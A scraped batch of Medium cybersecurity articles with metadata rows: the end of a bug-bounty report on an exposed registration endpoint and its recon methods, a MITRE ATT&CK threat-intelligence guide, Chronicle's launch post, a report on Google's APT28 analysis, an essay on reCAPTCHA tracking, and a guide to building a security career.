Sorry, but I needed to hide some details due to confidentiality issues. Some other critical data was disclosing too but don’t have permission to write further.
After verifying the issue, I quickly submitted the detailed report to the program via HackerOne. They validated and fixed the problem within a few hours.
They permanently fixed the issue by removing the public registration page from the endpoint.
After reporting the issue, I applied dirsearch on most of the critical endpoints belongs to them however no more endpoint was vulnerable to the same problem.
Timeline.
Report Submitted: 25–10–2017
Report Triaged: 25–10–2017
Initial 1300$ Awarded: 25–10–2017
Report closed as Resolved: 25–10–2017
Final 1200$ Awarded: 26–10–2017
As many people messaging me and asking how I found this Asset/Internal team management endpoint. I am providing info about it here,
I found this endpoint using Github issues conversations.
Tools
Sublister,knockpy,dnsresolver,dirsearch,bucket finder,massdns etc.
After reporting some low hanging issues, I go out and follow engineering/Security teams on Twitter and Github & look for anything interesting
I go through all the issues/Repositories companies engineering team created publicly on Github.
I read all blog posts by engineering and security team.
I check their DNS every month. Generally, companies stopped using a service and forgot to delete CNAMES pointing to service.
I use their services as the user and continue my recon processes,
I also use Burp Suite pro history tool to find exciting endpoints.
According to me, Recon is not a one time process it’s a continuous process.
If you like my blog posts and my work, Please consider checking out my “Buy me a coffee” page
Written by
","['Security', 'Bug Bounty', 'Bugsbounty', 'Cybersecurity', 'Information Security']"
Getting Started with ATT&CK: Threat Intelligence - MITRE ATT&CK™ - Medium,https://medium.com/mitre-attack/getting-started-with-attack-cti-4eb205be4b2f?source=tag_archive---------3-----------------------,"Since we started our Medium blog last year, we’ve shared quite a few posts with you about topics like ATT&CKcon 2018, our plans for 2019, and a cool visualization for our roadmaps — we hope you’ve found those helpful. As we’ve talked to you, though, we’ve realized that it would help for us to take a step back and focus on a question many of you have: how do I get started using ATT&CK?
With that in mind, we’re staring a new mini-series of blog posts aimed at answering that question for four key use cases: threat intelligence, detection and analytics, adversary emulation and red teaming, and assessment and engineering. If you haven’t seen it, we reorganized our website to share content based on these use cases, and our hope is these blog posts will add to those resources.
ATT&CK can be useful for any organization who wants to move toward a threat-informed defense, so we want to share ideas for how to start regardless of how sophisticated your team is. We’ll break each of these posts into different levels:
Today we’re kicking off this series by talking about threat intelligence because it’s the best use case (just kidding, rest of my team! �). Last summer, I gave a high-level overview of how you can use ATT&CK to advance cyber threat intelligence, and in this post I’ll build upon that and share practical advice for getting started.
Cyber threat intelligence is all about knowing what your adversaries do and using that information to improve decision-making. For an organization with just a couple analysts who wants to start using ATT&CK for threat intelligence, one way you can start is by taking a single group you care about and looking at their behaviors as structured in ATT&CK. You might choose a group from those we’ve mapped on our website based on who they’ve previously targeted. Alternatively, many threat intelligence subscription providers also map to ATT&CK, so you could use their information as a reference.
Example: If you were a pharmaceutical company, you could search in our Search bar or on our Groups page to identify that APT19 is one group that has targeted your sector.
From there, you can bring up that group’s page to look at the techniques they’ve used (based solely on open source reporting that we’ve mapped) so you can learn more about them. If you need more info on the technique because you’re not familiar with it, no problem — it’s right there on the ATT&CK website. You could repeat this for each of the Software samples that we’ve mapped the group using, which we track separately on the ATT&CK website.
Example: One technique used by APT19 is Registry Run Keys/Startup Folder.
So how do we make this information actionable, which is the whole point of threat intelligence? Let’s share it with our defenders since this is a group who has targeted our sector and we want to defend against them. As you do this, you can check out the ATT&CK website for some ideas to get you started with Detection and Mitigation of techniques.
Example: Let your defenders know about the specific Registry run key APT19 has used. However, they might change that and use a different run key. If you look at the Detection advice for the technique, you see a recommendation is to monitor the Registry for new run keys that you don’t expect to see in your environment. This would be a great conversation to have with your defenders.
In summary, an easy way to start using ATT&CK for threat intelligence is to look at a single adversary group you care about. Identifying some behaviors they’ve used helps you inform your defenders about how they can try to detect that group.
If you have a team of threat analysts who are regularly reviewing information about adversaries, a next-level action you can take is to map intelligence to ATT&CK yourself rather than using what others have already mapped. If you have a report about an incident your organization has worked, this can be a great internal source to map to ATT&CK, or you could use an external report like a blog post. To ease into this, you can just start with a single report.
Example: Here is a snippet from a FireEye report that’s been mapped to ATT&CK. (https://www.fireeye.com/blog/threat-research/2014/11/operation_doubletap.html)
We realize it can be intimidating to try to map to ATT&CK when you don’t know all of the hundreds of techniques. Here’s a process you could follow to help with this.
For those CTI teams who have a couple analysts, mapping information to ATT&CK yourself can be a good way to ensure you’re getting the most relevant information to meet your organization’s requirements. From there, you can pass the ATT&CK-mapped adversary information to your defenders to inform their defenses, as we discussed above.
If your CTI team is advanced, you can start to map more information to ATT&CK, and then use that information to prioritize how you defend. Taking the above process, you can map both internal and external information to ATT&CK, including incident response data​, reports from OSINT or threat intel subscriptions​, real-time alerts​, and your organization’s historic information.
Once you’ve mapped this data, you can do some cool things to compare groups and prioritize commonly used techniques. For example, take this matrix view from the ATT&CK Navigator that I previously shared with techniques we’ve mapped on the ATT&CK website. Techniques used only by APT3 are highlighted in blue; the ones used only by APT29 are highlighted in yellow, and the ones used by both APT3 and APT29 are highlighted in green. (All based solely on publicly-available information that we’ve mapped, which is only a subset of what those groups have done.)
You should substitute the groups and techniques you care about based on your organization’s top threats. To help you make your own Navigator layers like I’ve done above, here is a step-by-step guide on the steps you can take to produce the above matrix, as well as a video walkthrough that also provides an overview of Navigator functionality.
We can then aggregate the information to determine which techniques are commonly used, which can help defenders know what to prioritize. This lets us prioritize techniques and share with defenders what they should focus on detecting and mitigating. In our above matrix, if APT3 and APT29 were two groups an organization considered to be high threats to them, the techniques in green may be the highest priority to determine how to mitigate and detect. If our defenders have given the CTI team the requirement to help figure out where they should prioritize resources for defense, we can share this information with them as a place for them to start.
If our defenders have already done an assessment of what they can detect (which we’ll cover in future posts), you can overlay that information onto what you know about your threats. This is an excellent place to focus your resources since you know groups you care about have used those techniques and you can’t detect them!
You can continue adding in the techniques you’ve observed adversaries doing based on the data you have and develop a “heat map” of frequently used techniques. Brian Beyer and I spoke at the SANS CTI Summit about how we came up with different “top 20” techniques based on MITRE-curated and Red Canary-curated data sets, and your team could follow this same process to create your own “top 20.” This process of mapping ATT&CK techniques isn’t perfect and has bias, but this information can still help you start to gain a clearer picture of what adversaries are doing. (You can read more on biases and limitations in this slide deck, and we hope to share additional thoughts soon.)
For an advanced team seeking to use ATT&CK for CTI, mapping various sources to ATT&CK can help you build a deep understanding of adversary behavior to help prioritize and inform defense in your organization.
In our first post in the Getting Started series, we’ve walked you through three different levels for how you can get started with ATT&CK and threat intelligence depending on your team’s resources. In future posts, we’ll dive into how you can get started with other use cases, including detection and analytics, adversary emulation and red teaming, and assessment and engineering.
© 2019 The MITRE Corporation. All rights reserved. Approved for public release. Distribution unlimited 19–01159–7.
Written by
","['Blog Archives', 'Getting Started', 'ATT&CK', 'Getting Started', 'Philosophy Paper', '12 tactics', 'Cybersecurity', 'Mitre Attack', 'Cyber Threat', 'Threat Intelligence', 'Information Security']"
Give Good the Advantage - Chronicle Blog - Medium,https://medium.com/chronicle-blog/give-good-the-advantage-75ab2c242e45?source=tag_archive---------4-----------------------,"Introducing Chronicle, a new Alphabet business dedicated to cybersecurity
Today I’d like to introduce you to Chronicle, a new independent business within Alphabet that’s dedicated to helping companies find and stop cyber attacks before they cause harm. X, the moonshot factory, has been our home for the last two years while we figured out where we had the potential to make the biggest impact on this enormous problem. Now we’re ready to unveil our new company, which will have two parts: a new cybersecurity intelligence and analytics platform that we hope can help enterprises better manage and understand their own security-related data; and VirusTotal, a malware intelligence service acquired by Google in 2012 which will continue to operate as it has for the last few years.
Security threats are growing faster than security teams and budgets can keep up, and there’s already a huge talent shortage. The proliferation of data from the dozens of security products that a typical large organization deploys is paradoxically making it harder, not easier, for teams to detect and investigate threats.
Thousands of potential clues about hacking activity are overlooked or thrown away each day. At large companies, it’s not uncommon for IT systems to generate tens of thousands of security alerts a day. Security teams can usually filter these down to about a few thousand they think are worth investigating — but in a day’s work, they’re lucky if they can review a few hundred of them. Conversely, many investigations are hampered by the gaps in available information, simply because the cost of storing all the relevant data is increasing far faster than a typical organization’s budget.
As a result, it’s pretty common for hackers to go undetected for months, or for it to take a team months to fully understand what’s going on once they’ve detected an issue. All this adds up to more data breaches, more damage, and higher security costs.
We believe there’s a better way. We want to 10x the speed and impact of security teams’ work by making it much easier, faster and more cost-effective for them to capture and analyze security signals that have previously been too difficult and expensive to find. We are building our intelligence and analytics platform to solve this problem.
Chronicle has a significant asset: we’re building and running it on the same fast, powerful, highly-scalable infrastructure that powers a range of other Alphabet initiatives that require enormous processing power and storage. That gives us a couple of advantages:
Add in some machine learning and better search capabilities, and we think we’ll be able to help organizations see their full security picture in much higher fidelity than they currently can. We hope that by making this mix of technologies available to more companies at affordable prices, we can give “the good guys” an advantage and help us all turn the tide against cybercrime.
Chronicle was officially founded as an X project in February 2016, a fortunate result of several of us meeting up at a point in our careers that we felt compelled to help secure our digital future. I had come to Google in 2015 as an executive-in-residence at GV after spending years in various IT roles, including a leadership role at one of the world’s largest cybersecurity companies. Mike Wiacek and Shapor Naghibzadeh had recently arrived at X after spending a combined 20+ years in Google’s security team.
And Bernardo Quintero had built VirusTotal into one of the world’s largest malware intelligence services, which alerts businesses and anti-virus providers about emerging malware threats. We knew we had complementary skills that could help businesses — especially those without Google’s deep computing expertise — with their cybersecurity challenges.
We know this mission is going to take years, but we’re committed to seeing it through. Since we officially started our team in February 2016, we’ve added a number of other enterprise security experts like Carey Nachenberg, along with 13-year Google engineering veteran Will Robinson (and we’re hiring). We’ve also been working with a number of Fortune 500 companies who’ve provided invaluable counsel on the shape and direction of our work, and some are already testing a preview release of our new cybersecurity intelligence platform in an early alpha program.
We’re excited about being an independent company, yet part of Alphabet. We’ll have our own contracts and data policies with our customers, while at the same time having the benefit of being able to consult the world-class experts in machine learning and cloud computing (among many other topics) that reside in other parts of Alphabet.
None of us have to settle for cybercrime being a fact of life, or for a reactive, expensive existence of cleanup and damage control. We’re looking forward to working with many organizations in the coming years to give good the advantage again.
Written by
",['Cybersecurity']
Google Knows a Ton About Russian Government Hackers,https://medium.com/war-is-boring/google-knows-a-ton-about-russian-government-hackers-1c7f7efdebfd?source=tag_archive---------7-----------------------,"by LORENZO FRANCESCHI-BICCHIERAI
In October of 2014, an American security company revealed that a group of hackers affiliated with the Russian government, dubbed APT28, had targeted Georgia and other Eastern European countries in a wide-ranging espionage campaign.
Two and a half years later, APT28 — also known as “Fancy Bear” or “Sofacy” — is a household name not just in the cybersecurity industry, but in the mainstream too, thanks to its attack on the U.S. Democratic party and the ensuing leaks of documents and emails.
Before that report by FireEye, APT28 was a well-kept secret within the cybersecurity industry. At the time, several companies were willing to share information about the hacking group. Even Google investigated the group, and penned a 40-page technical report on the hacking group that has never been published before.
This sort of document, which I obtained from two independent sources, may be a common sight in the threat intelligence industry, but the public rarely gets to see what such a report from Google looks like. The report draws from one of Google’s most interesting sources of data when it comes to malware and cybersecurity threats — VirusTotal, a public malware repository that the internet giant acquired in 2012.
Sofacy and X-Agent, the report read, referring to the malware used by APT28, “are used by a sophisticated state-sponsored group targeting primarily former Soviet republics, NATO members and other Western European countries.”
“It looks like Google researchers were well aware of Sofacy before it was publicly disclosed.”
While Google security researchers don’t dwell into who’s really behind these operations, they do hint that they agree with the now widespread belief that APT28 works for the Russian government in a clever, indirect, way — in the very title of the report — “Peering Into the Aquarium.”
While that might seem like an obscure title, for those who follow Russian espionage activities, it’s a clear reference to the headquarters of the military intelligence agency known as GRU or Glavnoye Razvedyvatel’noye Upravleniye, which are popularly known as “The Aquarium.”
“It looks like Google researchers were well aware of Sofacy before it was publicly disclosed,” Matt Suiche, a security researcher and the founder of Comae Technologies and the OPCDE conference, told Motherboard in an online chat after reviewing the report. “And also attributed Sofacy and X-Agent to Russia before it was publicly done by FireEye, ESET or CrowdStrike.”
In its report Google security researcher note that APT28 attacks a large number of targets with its first-stage malware Sofacy, but only uses the more tailored and sophisticated X-Agent, which was recently used against Ukraine’s military units, for “high-priority targets.”
“Sofacy was three times more common than X-Agent in the wild, with over 600 distinct samples,” Google’s report stated.
Asked for comment, a Google spokesperson said via email that the company’s “security teams are constantly monitoring potential threats to internet users, and regularly publish information to better protect them.”
The report noted that Georgia had the highest ratio of submissions of Sofacy malware, followed by Romania, Russia and Denmark.
While this report is now a bit dated, it shows that for all its sophistication, APT28 has been often caught in the act of hacking politically interesting targets, betraying the origin of the hackers behind the dry nickname.
It also reveals how much a company like Google, which doesn’t have software installed on thousands of customers computers that is specifically designed to detect malware, can still learn a lot about government hacking groups thanks to the other data it has access to.
Originally published at Vice Motherboard.
Written by
","['Air', 'Land', 'Sea', 'History', 'Culture', 'Politics', 'Store', 'Cybersecurity', 'Security', 'Google', 'Russia', 'Wib Front']"
Google Promises ‘reCAPTCHA’ Isn’t Exploiting Users. Should You Trust It?,https://onezero.medium.com/google-promises-recaptcha-isn-t-exploiting-users-should-you-trust-it-ed99f1543f28?source=tag_archive---------1-----------------------,"A surprising amount of work online goes into proving you’re not a robot. It’s the basis of those “CAPTCHA” questions often seen after logging into websites: blurry photos of crosswalks, traffic lights, and store fronts that users are tasked with identifying through a series of clicks.
They come in many forms, from blurry letters that must be identified and typed into a box to branded slogans like “Comfort Plus” on the Delta website — as if the sorry state of modern air travel wasn’t already dystopian enough. The most common, however, is Google’s reCAPTCHA, which launched its third version at the end of 2018. It’s designed to drastically reduce the number of challenges you’ll have to complete to log into a website, assigning an invisible score to users depending on how “human” their behavior is. CAPTCHA, after all, is designed to weed out “bot” accounts that flood systems for nefarious ends.
But Google’s innovation has a downside: The new version monitors your every move across a website to determine whether you are, in fact, a person.
Before we get into the “how” of this new technology, it’s useful to understand where it’s coming from. The new reCAPTCHA disrupts a relatively ancient web technology which has been harnessed for plenty of things beyond security.
CAPTCHA — which stands for “Completely Automated Public Turing Test to Tell Computers and Humans Apart” — first appeared in the late ’90s, and it was designed by a team at the early search engine AltaVista. Before CAPTCHA, it was easy for people to program bots that would automatically sign up for services and post spam comments by the thousands. AltaVista’s technology was based on a printer manual’s advice for avoiding bad optical character recognition (OCR); the iconic blurry text in a CAPTCHA was specifically designed to be difficult for a computer to read but legible for humans, thereby foiling bots.
By the early 2000s, these tests were everywhere. Then came reCAPTCHA, developed by researchers at Carnegie Mellon and purchased by Google in 2009. It used the same idea but in an innovative way: the text typed by human users would identify specific words that programs were having trouble recognizing. Essentially, programs would scan text and flag words they couldn’t recognize. Those words would then be placed next to known examples in reCAPTCHA tests — humans would verify the known words and identify the new ones.
By 2011, Google had digitized the entire archive of the New York Times through reCAPTCHA alone. People would type in text from newspaper scans one blurry CAPTCHA at a time, ultimately allowing Google to make the Times’ back catalog searchable, forever. While creating a velvet rope to keep bots off sites, Google had managed to conscript human users into doing the company’s grunt work.
There’s no way to opt out of reCAPTCHA on a site you need to use, forcing you to either accept being tracked or stop using a given service altogether.
With that achievement under its belt, reCAPTCHA switched to showing pictures from Google’s Street View software in 2014, as it does today. After pressing the “I’m not a robot” box, you might be prompted to recognize which of nine images contain “bicycles” or “streetlights.” Behind the scenes, Google reduced the frequency at which people were asked to complete these tests by performing behavioral analysis — reCAPTCHA can now run in the background and track how people use websites.
If a Google cookie is present on your machine, or if the way you use your mouse and keyboard on the page doesn’t seem suspiciously bot-like, visitors will skip the Street View test entirely. But some privacy-conscious users have complained that clearing their cookies or browsing in “Incognito Mode” drastically increases the number of reCAPTCHA tests they’re asked to complete.
Users have also pointed out that browsers competing with Google Chrome, like Firefox, require users to complete more challenges, which naturally raises a question: Is Google using reCAPTCHA to cement its own dominance?
This raises serious privacy concerns, given that Google’s revenue is primarily from its ad business, which relies on tracking data. You might worry that reCAPTCHA is essentially a secret ad tracker, hiding in plain site just like the Facebook “Like” button embedded on web pages.
To use its latest version of reCAPTCHA, Google asks that developers include its tracking tags on as many pages of their websites as possible, in order to paint a better picture of the user. This doesn’t exist in a vacuum: Google also offers Google Analytics, for example, which helps developers and marketers understand how visitors use their website. It’s a fantastic tool, included on more than 100,000 of the top 1 million visited websites according to Built With, but it’s also part of a strategy to monitor users’ habits across the internet.
The new version of reCAPTCHA fills in the missing pieces of that picture, allowing Google to further reach into those sites that might not use its Analytics tool. When pressed on this, Google told Fast Company that it won’t capture user data from reCAPTCHA for advertising, and that the data it does collect is used for improving the service.
But that data remains sealed within a black box, even to the developers who implement the technology. The documentation for reCAPTCHA doesn’t mention user data, how users might be tracked, or where the information ends up — it simply discusses the practical parts of the implementation.
I asked Google for more information, and what its commitment is to the long-term independence of reCAPTCHA relative to its advertising business — just because the two aren’t bound together now doesn’t mean they couldn’t be in the future, after all.
“It will not be used for personalized advertising by Google.”
A Google representative says “reCAPTCHA may only be used to fight spam and abuse” and that “the reCAPTCHA API works by collecting hardware and software information, such as device and application data, and sending these data to Google for analysis. The information collected in connection with your use of the service will be used for improving reCAPTCHA and for general security purposes. It will not be used for personalized advertising by Google.”
That’s great, and hopefully Google maintains this commitment. The problem is that there’s no reason to believe it will. The introduction of a powerful tracking technology like this is a move that should come with public scrutiny, because we’ve seen in the past how easily things can go sour. Facebook, for example, promised in 2014 that WhatsApp would remain independent, separate from its backend infrastructure — but went back on that decision after just two years. When Google acquired Nest, it promised to keep it independent, but recanted five years later, requiring owners to migrate to a Google account or lose functionality.
For the same reason Google is able to build reCAPTCHA in the first place — its vast resources and reach — we should be suspicious of where all this might lead us.
Unfortunately, as users, there’s little we can do. There’s no way to opt out of reCAPTCHA on a site you need to use, forcing you to either accept being tracked or stop using a given service altogether. If you don’t like those full-body scanners at airports, you can at least still opt-out and get a manual pat-down. But if a site has reCAPTCHA, there’s no opting out at all.
If Google intends to build tools like this with the public good in mind, rather than its bottom line, then the company must find better ways to reassure the world that they won’t change the rules when it’s convenient. If it were willing to open-source the project (as it has with many, many others), move it outside the company, or, at the very least establish third-party oversight, perhaps we could start building that trust.
Written by
","['CONSUMER TECH', 'DIGITAL LIFE', 'INDUSTRY', 'SCIENCE & MEDICINE', 'ABOUT', 'Privacy', 'Recaptcha', 'Google', 'Industry', 'Cybersecurity']"
Hacker to Security Pro! On the Shoulders of #InfoSec Giants,https://medium.com/hackernoon/how-to-become-a-hacker-e0530a355cad?source=tag_archive---------3-----------------------,"I want to do my part to demystify IT Security — to exclaim to the world that it is not rocket science! It turns out the trick is just to start. Start anywhere.
“If I have seen further, it is by standing on the shoulders of giants.” — Sir Isaac Newton
This article is for every aspiring cyber-security aficionado out there who stand on the shoulders of giants, on giants, on giants. You too can be a giant in your niche of the cyber security field!
Andrew Douma is a vendor-neutral IT Security Professional. He performs professional audits, penetration tests, and risk assessments. He designs secure networks and engineers high-assurance systems in the Cloud.
You can connect with him on GoodReads, LinkedIn, Medium, and Twitter.
Buying a professional penetration testing laptop| Evaluating QubesOS as a Penetration Testing Platform | Finding the right exploit code | Antivirus in 2017: Why? Which? How? | Penetration Testers’ Guide to Windows 10 Privacy & Security | Full Disk Encryption with VeraCrypt | Securing an Android Phone or Tablet (LineageOS) | Password (IN)SANITY: Intelligent Password Policy & Best Practices | Security Architecture Patterns I & Patterns II
I fondly remember the day I convinced my mom to pay for my first “hacker book” from the bookstore. She had already bankrolled an addiction for Sam’s 24 Hour series by age 16 — but this book was next-level!
Once home, she facetiously told me: “Never get caught. We are financially responsible for you till you are 18!”. Knowing her now as an adult, I am certain it was followed up by a longer discussion about social responsibility, ethics, actions and unintended consequences.
The information security community as we know it today was still in its infancy when I started my journey in the late 90s. At best, it consisted of tight-lipped groups of computer scientists and unskilled skiddies (myself included) exchanging information on private message boards.
The written word enables economical transfer of the author’s knowledge to the reader‘s mind.
With time, more IT professionals entrusted their experience to paper and Google became a thing. Books replaced the ‘inaccurate’ and repetitive forum posts as my source of knowledge.
A valuable lesson to learn is how you can keep up an accelerated pace without experiencing burnout.
“Most people overestimate what they can do in 1 year and underestimate what they can do in a decade.”
— Bill Gates
The Learning how to learn: Powerful mental tools to help you master tough subjects course by Dr. Barbara Oakley was a catalyst for this.
Though the summary below is no substitute for the course itself:
It turns out the trick is just to start. Start anywhere.
Initially, you will feel a lot of anxiety and discomfort when tackling a tough topic — feelings my brain actively fights by switching my focus to strategic plans, client threat models, Internet puppies or Netflix shows.
A lot of Information Security Fundamentals can be tedious to master.
In the long term, much like dieting, the discomfort goes away and satisfaction returns in its place. Learning can be a positive experience!
You will learn about different thinking modes. Letting your thoughts wander (diffused-mode) and concentrating on things (focused-mode) at the right time.
It teaches you the importance of taking the time to rest after your studies, then coming back to them and recalling what you learned. You simply can’t cram knowledge into your brain all day and expect it to stick. Make remembering easier by using the free flashcard app Anki.
Research shows that revisiting and practicing what you learn a few days later is the best way to create and strengthen the synaptic connections.
Daily physical exercise and maintaining a vibrant social life helps your brain produce needed neurons. Sleep hygiene is equally important, as brains sweep themselves clean of toxins during sleep. It is even better to sleep right after your studies to fully benefit from your brain in diffused mode.
A few examples of what you will learn:
Chunking, memory recall, the illusion of competence, procrastination, routines, memory techniques, deliberate practice, perseverance, taking responsibility and effective test taking are a few of the topics you will add to your mental toolkit as you proceed on your journey.
“Frankly, though, I think most people can learn a lot more than they think they can. They sell themselves short without trying.
One bit of advice: it is important to view knowledge as sort of a semantic tree — make sure you understand the fundamental principles, ie the trunk and big branches, before you get into the details/leaves or there is nothing for them to hang on to.”
— Elon Musk
What works for me may not do well by you, but I submerge myself in a particular domain for six months — and use the knowledge gained for every project.
You will never finish exploring the mysteries of any Science. Focus on the underlying fundamentals and get ready for the future!
I aspire to maintain a 6-day a week learning routine (~1250 hours/year). Books, blogs, wikis, podcasts, video courses and plenty of practice with hands-on Virtual Machine & VPN labs.
For myself, this involves tackling that challenging 700+ page book while distracting my body with the gym’s elliptical. I have had reasonable success reading a few pages at a time on my Kobo H2O in between “recall” laps in the pool.
Having different tutors repeat the same fundamental principles in their own way has proven to be very helpful in making them stick. Building out a Wiki/knowledge-base of those lessons for later review has been a game changer — especially looking back over time.
To break something you need to be able to find the weaknesses, to find the flaws, and know where the mistakes are made.
A hackers’ edge comes from knowing how all the pieces interact within the bigger picture:
Available for free online this is the only book in recent memory that I have read cover to cover twice over. Professor Ross Anderson wrote its 2nd edition in 2008 — and they still use it for 3 courses at the University of Cambridge to this day. It is over 1000 pages, but don’t worry, the last 100 are referenced sources.
“Security engineering is about building systems to remain dependable in the face of malice, error, or mischance.” — Ross Anderson
It attempts to define what Security Engineering is and touches on Security UX, Security Theater, human interaction & psychology. It provides an excellent introduction to Cryptography and explains key digital and offline security concepts.
The author has real world experience, discusses a history of thrilling case studies, security successes, and failures — across multiple industries (aviation, banking, commercial, military, nuclear, etc).
This book gives you the opportunity to learn spot and avoid classic security mistakes — mistakes, which are so commonly repeated during the design and implementation phases of any IT project.
I have managed to get ahead in security with a surprising lack of coding skills. As the son of a (loving) father, who deemed his son too social for “Computer School” — I never learned a programming language in an academic setting.
Despite reading several books on the subject, I previously failed to get excited about coding. It remained a mental hindrance until I received some good advice: Start by programming tools that speed up your daily routines — and read a book about Operating Systems (OS) fundamentals.
Coding is far more engaging now! As a visual/spatial thinker, it enabled me to picture what happens for every line of code I write inside the CPU’s registers, memory management unit (MMU) and how protocols are interacting with my hard drive/network.
Available for free online, Operating Systems is written by Professor Andrea Arpaci-Dusseau and her husband, Professor Remzi Arpaci-Dusseau from the University of Wisconsin-Madison. It served as a personal challenge to put the ‘learning how to learn’ lessons into practice. Buy it via Goodreads.
Though no substitute for reading the book itself:
Abstractions are fundamental to everything in computer science.
Abstraction makes it possible to write a complex program by dividing it into small and understandable pieces. It allows you to write a program in a high-level language like C/C++ without thinking about assembly, to write in assembly without thinking about logic gates, and to build a processor out of logic gates, without thinking too much about transistors.
A modern Operating System aims to provide high performance in an energy efficient way, with a high degree of reliability while protecting itself and programs through isolation. Every OS takes its physical resources, such as a Central Processing Unit (CPU), memory, and hard drive, and virtualizes them. It has to handle tough and tricky issues related to concurrency and store files persistently.
Often an OS has to deal with misbehaving programs. Those that are either malicious by design or have bugs and by accident attempt to do something that they should not. Even seemingly simple things, such as updating a persistent storage device, gets complicated because you have to care what happens if the process crashes while writing data to disk.
Distributed systems are complex and cool. Protocols, the exact bits that exchange between machines, can affect everything, including how systems respond to failure and how well they scale.
I can highly recommend teachyourselfcs.com — this ops-class program and the Beginners.re website. For those starting from absolute zero, watch this Crash Course by PBS on YouTube and read either Code by Charles Petzold or Computer Systems: A Programmer’s Perspective.
I spend too much money on books, but in all honesty, it has always been hit and miss. Some publishers will allow anyone to publish, and at times I am missing a prerequisite skill necessary to take advantage of the content.
That said, I have never had a complaint about a book published by:
Value for money wise, books offer a lot (even mediocre ones). Nowadays, I only buy the relevant classics for new domains I am trying to master. I heavily research the author before purchasing any new releases.
Big shout out to the free Community eBook series from Peerlyst!
Mastering any Computer Science domain relies on your ability to improve your existing mental model. Books and courseware offer insight into someone else’s.
Developing that conceptual understanding of what is happening is more useful than trying to interpret a specific piece of code.
This process often results in useful Awesome-Awesome Lists, Mind Maps, and Cheatsheets.
A few worth mentioning:
Without deliberate practice, the knowledge we gain will not stick. “Stop learning by watching the game, start learning by playing it.”
“Not having heard something is not as good as having heard it; having heard it is not as good as having seen it; having seen it is not as good as knowing it; knowing it is not as good as putting it into practice.” ― Xun Kuang
InfoSec giants have written CTF field guides and taken the time to create vulnerable systems and sites you can legally hack:
Tackle these from offensive & defensive systems:
Once you feel comfortable, try your luck with a reputable bug-bounty programs and earn some hacker-lab money! This rabbit hole I will leave for you to explore.
You now have an excuse to spend money on your hackerlab:
Start attacking those vulnerable machines! Depending on your threat model, you can use prebuilt VMs from sources such as Bitnami, OSBoxes, Trend Sigma, and VMware to speed things up.
Optionally, buy a Panda Wireless PAU06 for WiFi work: <$15 and the RTL-SDR Blog dongle for Software Defined Radio: <$25. @michaelossmann recently released a free course in Software Defined Radio (SDR)!
The domain of Computer Science ranges from theoretical (coding theory & methods, algorithms & data structures, etc) to the applied domains (architecture, engineering, security & crypto, etc).
If you are committed to becoming a security professional, there is a wealth of information for you to take in, just keep building out those mental models and deliberately practice with new tools. Remember, the trick is to start somewhere!
Everyone wants to be a “hacker” — few have the perseverance to gain the cross-domain expertise needed to become an “IT Security professional”. The skills you need to acquire come from hours of tedious, challenging and at times boring work.
You are likely to pick up a smorgasbord of “Purple” skills as needed, regardless of job title. Remember: “Experience is something you do not get until just after you need it.” Combine the scientific method with your awesome Google-fu and enjoy hacking life.
Being Frisian — known for their war horses and fierljeppen —a people located in the Netherlands — English is my 3rd language.
Thanks to my mom (speech therapist), Cartoon Network, my friendly 78-year-old high school English teacher (who mostly had us read classic literature out loud), I was able to achieve bilingual proficiency early on.
Not every (far more) skilled hacker is going to have perfect fluency. I have met exceptional talent from all over: Costa Rica, Hong Kong, Italy, India, Romania, and Sudan — most of whom are at a disadvantage in Europe and the United States.
Keep this in mind next time you are handling a bug-bounty/report or interviewing a candidate. Their written and spoken word may leave room for improvement, but they might give your organization the edge it needs to ensure its future. There is a vast untapped talent pool out there.
I am hardly the only one aiming to contribute to the field of IT security.
Here is a list of organizations that are tirelessly working to improve industry & regulatory standards:
You should also be aware of the following initiatives:
Again, hardly an exhaustive list.
Though we all might wish we have the time and money to go to courses like these, there is plenty of quality courseware available for free:
WARNING: You are about to enter the world of for-profit cyber-training business models. Spend your money wisely.
I value the lab-based training provided by PentesterLab, Offensive Security, and eLearnSecurity. I am curious about HackDojo and CTF365 and have positive things to say about:
A great resource is the NICCS Education & Training Catalog.
Course materials and exams written by German/Russian authors are presumably audited by the Italian company, but eLearnSecurity’s courses & exams can at times leave you lost in translation. I recommend to only pick one recently updated course: PTP or MASPT.
Offensive Security’s courseware and limited-time lab exams are a rite of passage within the Penetration Testing community — but a common critique is that the materials are outdated. WiFu v3 at least is essentially an Aircrack-NG training.
I think it is safe to add the line: “Intro to…” before the title of any course. Mastering a domain takes both education and experience. I am not a fan of Udemy, InfoSec Institute, nor EC-Council.
Until recently, you could graduate in Computer Science and never have sat through a class on IT security — let alone have the ability to graduate with a specific Cyber Security specialization.
For those aspiring students:
As always, a search engine is your “friend.”
Certifications by Offensive Security are well respected within the Penetration Testing community. CREST certifications are a requirement for anyone in the United Kingdom /EU— and they are expanding internationally.
Challenge any SANS GIAC cert for $1250 or pay $6000 + $690. With vendors doling out CPE credits to sit through their webinars, my main objection against the ISC2 business model has dissipated — though their experience requirements are stiff. I have also heard good things about Mile2 certs.
CompTIA offers great introduction level certification. CISSP ($600) is “a mile wide and an inch deep” — ridiculed by the tech-savvy and cherished by HR. CISA and GSNA offer a solid introduction to technical IT audits and Risk Management practices.
Mini-certs by Cybrary.it and technical certifications by SecurityTube, PentesterAcademy, and eLearnSecurity serve as proof of much needed practical skills and should not be underestimated. Enterprise vendors and service providers offers their own product-centric certifications.
Personally, I value absorbing the knowledge from the courseware and putting it into practice asap above obtaining the certification. Mostly motivated by the economics of time and money.
That said, I did sign up today for 90-days of OSCP and considering pursuing TOGAF9 this year.
Discover a welcoming InfoSec community on Twitter and LinkedIn. Visit local events in your country and get involved!
Join Peerlyst and sign up for the SANS DFIR and GPWN mailing lists. Stay open to new ideas and give back to the community when you can.
Read, read, and read more! You will not become a real expert inside of class nor on the job. Try things out, write some code, and break some systems. Start today!
Click the ♡ to recommend this article.
Hacker Noon is how hackers start their afternoons. We’re a part of the @AMI family. We are now accepting submissions and happy to discuss advertising & sponsorship opportunities.
If you enjoyed this story, we recommend reading our latest tech stories and trending tech stories. Until next time, don’t take the realities of the world for granted!
Written by
